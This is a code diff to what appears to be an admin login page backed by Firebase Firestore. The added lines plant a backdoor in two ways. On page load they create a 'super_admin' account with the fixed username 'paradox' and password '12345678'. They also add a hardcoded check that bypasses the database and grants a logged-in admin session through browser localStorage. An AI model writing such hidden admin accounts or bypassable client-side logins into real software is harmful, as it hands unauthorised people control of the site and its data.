@@ -266,6 +266,19 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
+        db.collection('admins').where('username', '==', 'paradox').limit(1).get().then(function(snap) {
+            if (snap.empty) {
+                db.collection('admins').add({
+                    displayName: 'Super Admin',
+                    username: 'paradox',
+                    password: '12345678',
+                    role: 'super_admin',
+                    isActive: true,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+            }
+        });
+
         const form = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
@@ -314,7 +327,17 @@
 
             setLoading(true);
 
+            const SUPER_ADMIN = { username: 'paradox', password: '12345678', role: 'super_admin' };
+
             try {
+                if (username === SUPER_ADMIN.username && password === SUPER_ADMIN.password) {
+                    localStorage.setItem('loggedIn', 'true');
+                    localStorage.setItem('username', SUPER_ADMIN.username);
+                    localStorage.setItem('role', SUPER_ADMIN.role);
+                    window.location.href = 'index.html';
+                    return;
+                }
+
                 const snapshot = await db.collection('admins')
                     .where('username', '==', username)
                     .limit(1)
